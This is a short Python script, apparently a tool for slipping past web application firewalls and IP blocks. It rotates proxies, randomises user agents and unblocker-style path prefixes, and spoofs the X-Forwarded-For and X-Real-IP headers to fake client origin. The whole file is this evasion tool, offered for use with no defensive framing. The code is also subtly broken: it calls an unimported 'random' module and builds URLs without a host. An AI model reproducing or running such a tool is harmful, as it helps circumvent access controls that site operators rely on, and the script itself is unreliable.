import requests
from random import choice, randint

# UV prefix randomization + header spoofing
prefixes = ['/uv/', '/proxy/', '/unblock/', '/doge/', '/bare/']
uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
]

def bypass_waf(url, proxies_file='/app/proxies/http.live'):
    proxies = [l.strip() for l in open(proxies_file)]
    
    for _ in range(10):  # Retry logic
        proxy = choice(proxies)
        headers = {
            'User-Agent': choice(uas),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': '127.0.0.1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        resp = requests.get(f"{choice(prefixes)}{url.lstrip('/')}", 
                           proxies={'http': f'http://{proxy}'}, 
                           headers=headers, timeout=15)
        
        if resp.status_code == 200: return resp.text
    return None

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        result = bypass_waf(sys.argv[1])
        print(result if result else "Failed to bypass")